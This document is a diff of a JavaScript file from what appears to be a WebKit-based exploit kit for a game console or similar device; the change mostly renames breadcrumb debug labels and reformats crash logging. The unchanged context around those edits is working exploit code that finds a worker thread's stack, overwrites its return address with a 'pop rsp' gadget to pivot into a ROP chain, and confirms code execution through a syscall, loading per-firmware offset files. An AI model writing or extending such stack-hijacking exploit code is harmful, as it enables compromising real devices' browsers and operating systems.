@@ -197,9 +197,12 @@ function crumbsTake() {
 async function prepare(p) {
 
     const prevCrumbs = crumbsTake();
-    if (prevCrumbs)
-        jbmark("PREV-CRUMBS", "the last run died right after: " + prevCrumbs);
-    crumb("prepare");
+    if (prevCrumbs) {
+        const parts = prevCrumbs.split(">");
+        jbmark("PREV-CRUMBS", "died-after=" + parts.slice(-5).reverse().join(" <= ")
+            + " (" + parts.length + " steps)");
+    }
+    crumb("prep");
 
     let textArea = document.createElement("textarea");
 
@@ -686,7 +689,7 @@ async function prepare(p) {
     await wait_for_worker();
     jbmark("PREP-POST-WORKER-AWAIT", "survived-the-first-yield");
 
-    crumb("find_worker");
+    crumb("fw");
     let worker_stacks = find_worker(p, libKernelBase);
     let worker_stack = worker_stacks[0];
     jbmark("PREP-WORKER-STACK", "stack=0x" + worker_stack.toString()
@@ -701,9 +704,8 @@ async function prepare(p) {
         // Backward-compatible path for original profiles without a saved-PC fingerprint.
         return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
     }
-    crumb("retslot@0x" + return_address_ptr.toString()
-        + (window.__wwrPicked !== undefined
-            ? "/rva0x" + window.__wwrPicked.toString(16) : ""));
+    crumb("rs" + (window.__wwrPicked !== undefined
+        ? "/rva0x" + window.__wwrPicked.toString(16) : ""));
     let original_return_address = p.read8(return_address_ptr);
     let stack_pointer_ptr = return_address_ptr.add32(0x8);
 
@@ -729,8 +731,9 @@ async function prepare(p) {
                 + "-poprsp=0x" + gadgets["pop rsp"].toString()
                 + "-rsp=0x" + chain.stack_entry_point.toString());
 
-        crumb("arm(rsp=0x" + chain.stack_entry_point.toString() + ")");
+        crumb("w1");
         p.write8(return_address_ptr, gadgets["pop rsp"]);
+        crumb("w2");
         p.write8(stack_pointer_ptr, chain.stack_entry_point);
         crumb("armed");
 
@@ -740,10 +743,10 @@ async function prepare(p) {
             worker.onmessage = function (e) {
                 resolve(1);
             }
-            crumb("postMessage");
+            crumb("pm");
             worker.postMessage(0);
         });
-        crumb("worker-answered");
+        crumb("wans");
         if (window.jb && window.jb.hot)
             jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1);
         if (p1 == 0) {
@@ -784,9 +787,9 @@ async function prepare(p) {
     jbmark("PREP-GETPID-PRE", "retval=0x" + chain.return_value.toString()
         + "-poisoned-next=chain.syscall(SYS_GETPID)");
 
-    crumb("getpid-call");
+    crumb("gp-call");
     let pid = await chain.syscall(SYS_GETPID);
-    crumb("getpid-returned");
+    crumb("gp-ret");
 
     jbmark("PREP-GETPID-POST", "raw=0x" + pid.toString());
     if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
@@ -801,7 +804,7 @@ async function prepare(p) {
         throw new Error("Webkit exploit failed.");
     }
     jbmark("PREP-GETPID-OK", "pid=" + pid.low);
-    crumb("prepare-OK");
+    crumb("OK");
 
     return { p: p2, chain: chain };
 }
@@ -809,4 +812,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=22`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=23`);
